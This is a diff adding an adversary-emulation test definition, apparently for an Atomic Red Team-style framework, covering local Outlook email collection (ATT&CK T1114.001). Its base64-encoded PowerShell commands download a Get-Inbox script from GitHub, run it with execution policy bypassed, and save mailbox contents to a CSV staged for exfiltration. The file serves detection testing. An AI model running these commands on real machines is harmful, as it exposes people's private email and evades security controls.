@@ -1,0 +1,25 @@
+- id: 1c1dcce7-40d2-55b2-be59-d29b3fbf3e43
+  name: Soumaia ART Tests - Email Collection with PowerShell Get-Inbox
+  description: 'Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.
+
+    Successful execution will produce stdout message stating "Please be patient, this may take some time...". Upon completion, final output will be a mail.csv file.
+
+
+    Note: Outlook is required, but no email account necessary to produce artifacts.'
+  tactic: collection
+  technique:
+    attack_id: T1114.001
+    name: 'Email Collection: Local Email Collection'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAHMAcgBjAFwARwBlAHQALQBJAG4AYgBvAHgALgBwAHMAMQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADEAMQA0AC4AMAAwADEALwBzAHIAYwAvAEcAZQB0AC0ASQBuAGIAbwB4AC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAHMAcgBjAFwARwBlAHQALQBJAG4AYgBvAHgALgBwAHMAMQAiAAoA
+          }
+          powershell -executionpolicy bypass -command ".\src\Get-Inbox.ps1" -file $env:TEMP\mail.csv
+        cleanup: |-
+          Remove-Item $env:TEMP\mail.csv -Force -ErrorAction Ignore
+        payloads:
+        - src
